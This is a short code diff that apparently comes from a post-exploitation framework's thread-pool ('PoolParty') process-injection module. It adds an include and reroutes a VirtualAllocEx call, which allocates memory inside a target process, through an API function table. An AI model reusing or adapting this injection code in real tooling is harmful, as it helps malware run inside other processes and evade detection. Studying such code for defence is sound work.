@@ -1,4 +1,5 @@
 #include "common.h"
+#include "common_metapi.h"
 #include "pool_party.h"
 #include "pool_party_ext.h"
 
@@ -229,7 +230,7 @@ DWORD remote_tp_direct_insertion(HANDLE hProcess, DWORD dwDestinationArch, LPVOI
 
 		if (hHijackHandle != INVALID_HANDLE_VALUE) {
 			*(QWORD*)((BYTE*)lpDirect + TP_DIRECT_STRUCT_CB_OFFSET_X64) = (QWORD) lpStartAddress;
-			LPVOID RemoteDirectAddress = VirtualAllocEx(hProcess, NULL, TP_DIRECT_STRUCT_SIZE_X64, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+			LPVOID RemoteDirectAddress = met_api->win_api.kernel32.VirtualAllocEx(hProcess, NULL, TP_DIRECT_STRUCT_SIZE_X64, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 			if (!RemoteDirectAddress) {
 				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][remote_tp_direct_insertion] Unable to allocate RemoteDirectAddress.", ERROR_NOT_SUPPORTED)
 			}
